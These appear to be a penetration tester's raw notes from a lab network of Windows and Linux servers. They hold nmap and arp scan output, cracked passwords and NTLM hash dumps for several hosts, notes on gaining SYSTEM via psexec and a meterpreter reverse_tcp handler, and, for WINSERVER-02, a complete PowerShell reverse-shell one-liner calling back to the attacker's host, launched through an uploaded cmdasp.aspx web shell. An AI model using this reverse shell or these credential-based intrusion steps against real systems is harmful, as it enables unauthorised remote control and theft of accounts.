
initial arp scan

Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.1   06:6a:02:d7:6e:c6       (Unknown: locally administered)
192.168.100.50  06:da:c3:e0:c5:80       (Unknown: locally administered)
192.168.100.51  06:b8:59:cb:6f:a2       (Unknown: locally administered)
192.168.100.52  06:49:d3:a1:24:70       (Unknown: locally administered)
192.168.100.55  06:37:d5:d2:7f:b2       (Unknown: locally administered)
192.168.100.63  06:f1:4e:e4:c9:98       (Unknown: locally administered)
192.168.100.67  06:07:3b:8e:3c:e0       (Unknown: locally administered)

hosts on initial network

192.168.100.1
192.168.100.5 - ME
192.168.100.50
192.168.100.51
192.168.100.52
192.168.100.55
192.168.100.63
192.168.100.67

initial nmap scans

## creds

superman         (admin)     
diamond          (mike)     
greenday         (vince)     
[22][ssh] host: 192.168.100.52   login: auditor   password: qwertyuiop - this is also login for drupal
dbadmin:sayang
steven:bonita
root: - credentials mariadb

admin:estralla - wp-admin password
192.168.100.50
=

name: Computer        : WINSERVER-01

## connect with persistence sevice
port 4444
multi/handler - windows/meterpreter/reverse_tcp


## credentials found 
[445][smb] host: 192.168.100.50   login: admin   password: superman
gained root with psexec through smb - NT AUTHORITY\SYSTEM

## Hashes
admin:1011:aad3b435b51404eeaad3b435b51404ee:72f5cfa80f07819ccbcfb72feb9eb9b7:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:5c4d59391f656d5958dab124ffeabc20:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
mike:1009:aad3b435b51404eeaad3b435b51404ee:c7bad7d1cc2f3c69adea5ccb429234ad:::
vince:1010:aad3b435b51404eeaad3b435b51404ee:c9b30a86acaea990bf9fa6c35ac9dd92:::

route print
===========================================================================
Interface List
 12...06 da c3 e0 c5 80 ......AWS PV Network Device #0
  1...........................Software Loopback Interface 1
 14...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
 0.0.0.0          0.0.0.0    192.168.100.1   192.168.100.50     10
127.0.0.0        255.0.0.0         On-link         127.0.0.1    306
127.0.0.1  255.255.255.255         On-link         127.0.0.1    306
127.255.255.255  255.255.255.255         On-link         127.0.0.1    306
169.254.169.123  255.255.255.255    192.168.100.1   192.168.100.50     10
169.254.169.249  255.255.255.255    192.168.100.1   192.168.100.50     10
169.254.169.250  255.255.255.255    192.168.100.1   192.168.100.50     10
169.254.169.251  255.255.255.255    192.168.100.1   192.168.100.50     10
169.254.169.253  255.255.255.255    192.168.100.1   192.168.100.50     10
169.254.169.254  255.255.255.255    192.168.100.1   192.168.100.50     10
192.168.100.0    255.255.255.0         On-link    192.168.100.50    266
192.168.100.50  255.255.255.255         On-link    192.168.100.50    266
192.168.100.255  255.255.255.255         On-link    192.168.100.50    266
224.0.0.0        240.0.0.0         On-link         127.0.0.1    306 224.0.0.0        240.0.0.0         On-link    192.168.100.50    266
255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
255.255.255.255  255.255.255.255         On-link    192.168.100.50    266


*Interface: 192.168.100.50 --- 0xc
  Internet Address      Physical Address      Type
  169.254.169.254       06-6a-02-d7-6e-c6     dynamic   
  192.168.100.1         06-6a-02-d7-6e-c6     dynamic   
  192.168.100.5         06-04-91-51-1a-a4     dynamic   
  192.168.100.255       ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.252           01-00-5e-00-00-fc     static    
  255.255.255.255       ff-ff-ff-ff-ff-ff     static*

TCP    192.168.100.50:49849   192.168.100.5:4444     CLOSE_WAIT      1272
  TCP    192.168.100.50:49905   192.168.100.5:4444     ESTABLISHED     3924
  TCP    192.168.100.50:49971   15.221.12.185:443      SYN_SENT        1488
  TCP    192.168.100.50:49972   169.254.169.254:80     ESTABLISHED     1640

## ipconfig

Windows IP Configuration

   Host Name . . . . . . . . . . . . : WINSERVER-01
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : ap-southeast-1.ec2-utilities.amazonaws.com
                                       us-east-1.ec2-utilities.amazonaws.com
                                       ap-southeast-1.compute.internal
                                       ec2.internal

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
   Description . . . . . . . . . . . : AWS PV Network Device #0
   Physical Address. . . . . . . . . : 06-DA-C3-E0-C5-80
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::41ac:39cc:9d1a:5fb%12(Preferred) 
   IPv4 Address. . . . . . . . . . . : 192.168.100.50(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Lease Obtained. . . . . . . . . . : Thursday, July 13, 2023 10:10:50 PM
   Lease Expires . . . . . . . . . . : Friday, July 14, 2023 12:10:50 AM
   Default Gateway . . . . . . . . . : 192.168.100.1
   DHCP Server . . . . . . . . . . . : 192.168.100.1
   DHCPv6 IAID . . . . . . . . . . . : 319697556
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-29-F3-B7-F0-02-46-17-26-CD-17
   DNS Servers . . . . . . . . . . . : 192.168.0.2
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.ap-southeast-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : ap-southeast-1.compute.internal
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes

### Notes
- has exposed myphpadmin 5.1.1 login panel
- php version 7.4.26
- phpmyadmin 4.9.7 forbidden
- says there is a wordpress attached
- running wampserver 3.2.6 64bit
- mysql version 5.7.36 port 3306
- mariadb version 10.6.5 port 3307
- added wordpress.local to /etc/hosts got a redirect to the website
- apache not inherently vulnerable

## syntex solutions wordpress site 5.9.3

- spintech wordpress theme
- found user admin
- contains search function

### what web results 
http://wordpress.local [200 OK] Apache[2.4.51], Bootstrap[1.0,5.9.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.51 (Win64) PHP/7.4.26], IP[192.168.100.50], JQuery[3.6.0], MetaGenerator[WordPress 5.9.3], PHP[7.4.26], Script[text/javascript], Title[Syntex], UncommonHeaders[link], WordPress[5.9.3], X-Powered-By[PHP/7.4.26]

## myscripts

not vuln to enternalblue

Host script results:
| smb-protocols: 
|   dialects: 
|     NT LM 0.12 (SMBv1) [dangerous, but default]
|     2.0.2
|     2.1
|     3.0
|_    3.0.2

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Nmap scan report for ip-192-168-100-50.ap-southeast-1.compute.internal (192.168.100.50)
Host is up (0.00037s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-title: WAMPSERVER Homepage
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2023-07-13T22:22:13+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WINSERVER-01
| Not valid before: 2023-07-12T22:11:19
|_Not valid after:  2024-01-11T22:11:19
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-01
|   NetBIOS_Domain_Name: WINSERVER-01
|   NetBIOS_Computer_Name: WINSERVER-01
|   DNS_Domain_Name: WINSERVER-01
|   DNS_Computer_Name: WINSERVER-01
|   Product_Version: 6.3.9600
|_  System_Time: 2023-07-13T22:21:31+00:00
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 06:DA:C3:E0:C5:80 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: WINSERVER-01
|   NetBIOS computer name: WINSERVER-01\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-13T22:21:32+00:00
|_nbstat: NetBIOS name: WINSERVER-01, NetBIOS user: \<unknown\>, NetBIOS MAC: 06:da:c3:e0:c5:80 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-07-13T22:21:31
|_  start_date: 2023-07-13T22:11:04
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required


192.168.100.51
=

name: winserver-02
users
Administrator            Guest                    steven

## credentials
steven:bonita

## access 
can get access with cmd shell through web cmdasp.aspx

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.100.5',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

nc listener

Host Name:                 WINSERVER-02
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          EC2
Registered Organization:   Amazon.com
Product ID:                00252-70000-00000-AA535
Original Install Date:     12/31/2021, 8:01:42 AM
System Boot Time:          7/13/2023, 10:09:32 PM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 79 Stepping 1 GenuineIntel ~2300 Mhz
BIOS Version:              Xen 4.11.amazon, 8/24/2006
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC) Coordinated Universal Time
Total Physical Memory:     16,384 MB
Available Physical Memory: 15,424 MB
Virtual Memory: Max Size:  24,576 MB
Virtual Memory: Available: 23,414 MB
Virtual Memory: In Use:    1,162 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 223 Hotfix(s) Installed.

Nmap scan report for ip-192-168-100-51.ap-southeast-1.compute.internal (192.168.100.51)
Host is up (0.00032s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-19-22  02:25AM       \<DIR\>          aspnet_client
| 04-19-22  01:19AM                 1400 cmdasp.aspx
| 04-19-22  12:17AM                99710 iis-85.png
| 04-19-22  12:17AM                  701 iisstart.htm
|_04-19-22  02:13AM                   22 robots.txt.txt
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-svn-info: ERROR: Script execution failed (use -d to debug)
| http-webdav-scan: 
|   Server Date: Thu, 13 Jul 2023 22:21:32 GMT
|   Server Type: Microsoft-IIS/8.5
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   Directory Listing: 
|     http://ip-192-168-100-51.ap-southeast-1.compute.internal/
|     http://ip-192-168-100-51.ap-southeast-1.compute.internal/aspnet_client/
|     http://ip-192-168-100-51.ap-southeast-1.compute.internal/cmdasp.aspx
|     http://ip-192-168-100-51.ap-southeast-1.compute.internal/iis-85.png
|     http://ip-192-168-100-51.ap-southeast-1.compute.internal/iisstart.htm
|_    http://ip-192-168-100-51.ap-southeast-1.compute.internal/robots.txt.txt
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=WINSERVER-02
| Not valid before: 2023-07-12T22:10:54
|_Not valid after:  2024-01-11T22:10:54
|_ssl-date: 2023-07-13T22:22:13+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-02
|   NetBIOS_Domain_Name: WINSERVER-02
|   NetBIOS_Computer_Name: WINSERVER-02
|   DNS_Domain_Name: WINSERVER-02
|   DNS_Computer_Name: WINSERVER-02
|   Product_Version: 6.3.9600
|_  System_Time: 2023-07-13T22:21:36+00:00
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 06:B8:59:CB:6F:A2 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-13T22:21:33
|_  start_date: 2023-07-13T22:10:41
|_nbstat: NetBIOS name: WINSERVER-02, NetBIOS user: \<unknown\>, NetBIOS MAC: 06:b8:59:cb:6f:a2 (unknown)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)


192.168.100.52
=
## findings
found update.txt in ftp server

## credentials
[22][ssh] host: 192.168.100.52   login: auditor   password: qwertyuiop - this is also login for drupal
dbadmin:sayang

admin@syntex.com - admin email for drupal

drupal:syntex0421

priviledge escalation weak permissions sudo

drupal version 7.57

there is password reset admin, look for smtp servers

## couldnt get access to mysql, try again later check samba for password -samba had nothing


Nmap scan report for ip-192-168-100-52.ap-southeast-1.compute.internal (192.168.100.52)
Host is up (0.00073s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.100.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 65534    65534         318 Apr 18  2022 updates.txt
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4d:01:d2:e1:74:0a:ab:6d:87:11:4e:7f:b5:fc:a9:8d (RSA)
|   256 a2:1e:96:e3:15:8e:7f:b1:7b:a6:ff:2a:f5:d3:14:59 (ECDSA)
|_  256 9b:03:29:af:54:de:30:68:b3:a0:40:f2:2b:97:be:ef (ED25519)
80/tcp   open  http          Apache httpd 2.4.41
|_http-title: Index of /
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2018-02-21 17:28  drupal/
|_
|_http-server-header: Apache/2.4.41 (Ubuntu)
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   Samba smbd 4.13.17-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql         MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
|   Thread ID: 38
|   Capabilities flags: 63486
|   Some Capabilities: Speaks41ProtocolNew, SupportsTransactions, Speaks41ProtocolOld, ODBCClient, Support41Auth, SupportsLoadDataLocal, FoundRows, ConnectWithDatabase, DontAllowDatabaseTableColumn, LongColumnFlag, IgnoreSpaceBeforeParenthesis, SupportsCompression, IgnoreSigpipes, InteractiveClient, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: Xdmw0$dM2S+yE,Ilb)@J
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server xrdp
MAC Address: 06:49:D3:A1:24:70 (Unknown)
Service Info: Host: IP-192-168-100-52; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.13.17-Ubuntu)
|   Computer name: ip-192-168-100-52
|   NetBIOS computer name: IP-192-168-100-52\x00
|   Domain name: ap-southeast-1.compute.internal
|   FQDN: ip-192-168-100-52.ap-southeast-1.compute.internal
|_  System time: 2023-07-13T22:21:34+00:00
|_clock-skew: mean: 0s, deviation: 1s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_nbstat: NetBIOS name: IP-192-168-100-, NetBIOS user: \<unknown\>, NetBIOS MAC: \<unknown\> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-07-13T22:21:33
|_  start_date: N/A

192.168.100.55
=
WINSERVER-03

## CREDS
mary:hotmama
login: Administrator   password: swordfish - login with psexec smb module

admin                    Administrator            DefaultAccount           
Guest                    lawrence                 mary                     
student                  WDAGUtilityAccount

swordfish        (Administrator)     
computadora      (lawrence)     
hotmama          (mary)     
blanca           (admin) 

## Hashes
admin:1011:aad3b435b51404eeaad3b435b51404ee:0f2011271b98907e6d288066567d3319:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:61fb34469b9989b01be4e8630c52eed6:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lawrence:1009:aad3b435b51404eeaad3b435b51404ee:18aa104784f77431563b1a1b67f6096c:::
mary:1010:aad3b435b51404eeaad3b435b51404ee:11637a16fca11b3604e3e68d5221b3c7:::
student:1008:aad3b435b51404eeaad3b435b51404ee:bd4ca1fbe028f3c5066467a7f6a73b0b:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:58f8e0214224aebc2c5f82fb7cb47ca1:::

Nmap scan report for ip-192-168-100-55.ap-southeast-1.compute.internal (192.168.100.55)
Host is up (0.00044s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-07-13T22:22:13+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-03
|   NetBIOS_Domain_Name: WINSERVER-03
|   NetBIOS_Computer_Name: WINSERVER-03
|   DNS_Domain_Name: WINSERVER-03
|   DNS_Computer_Name: WINSERVER-03
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-13T22:21:33+00:00
| ssl-cert: Subject: commonName=WINSERVER-03
| Not valid before: 2023-07-12T22:10:50
|_Not valid after:  2024-01-11T22:10:50
MAC Address: 06:37:D5:D2:7F:B2 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-07-13T22:21:33
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: \<blank\>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: WINSERVER-03
|   NetBIOS computer name: WINSERVER-03\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-07-13T22:21:33+00:00
|_nbstat: NetBIOS name: WINSERVER-03, NetBIOS user: \<unknown\>, NetBIOS MAC: 06:37:d5:d2:7f:b2 (unknown)

192.168.100.63
=
Nmap scan report for ip-192-168-100-63.ap-southeast-1.compute.internal (192.168.100.63)
Host is up (0.00046s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2023-07-13T22:22:14+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=WIN-C656N5C775D
| Not valid before: 2023-07-12T21:59:54
|_Not valid after:  2024-01-11T21:59:54
| rdp-ntlm-info: 
|   Target_Name: WIN-C656N5C775D
|   NetBIOS_Domain_Name: WIN-C656N5C775D
|   NetBIOS_Computer_Name: WIN-C656N5C775D
|   DNS_Domain_Name: WIN-C656N5C775D
|   DNS_Computer_Name: WIN-C656N5C775D
|   Product_Version: 6.3.9600
|_  System_Time: 2023-07-13T22:21:36+00:00
49155/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 06:F1:4E:E4:C9:98 (Unknown)
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-07-13T22:21:34
|_  start_date: 2023-07-13T22:09:33
|_nbstat: NetBIOS name: WIN-C656N5C775D, NetBIOS user: \<unknown\>, NetBIOS MAC: 06:f1:4e:e4:c9:98 (unknown)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required


192.168.100.67
=
Nmap scan report for ip-192-168-100-67.ap-southeast-1.compute.internal (192.168.100.67)
Host is up (0.00075s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 87:b7:65:18:a5:8b:f9:83:a4:b8:63:5c:a9:13:17:86 (RSA)
|   256 ef:1f:37:09:7a:14:09:f2:ea:f4:58:6d:84:84:8f:e7 (ECDSA)
|_  256 0a:a9:58:03:60:d9:12:9b:5a:0f:3d:e3:b9:94:55:87 (ED25519)
MAC Address: 06:07:3B:8E:3C:E0 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


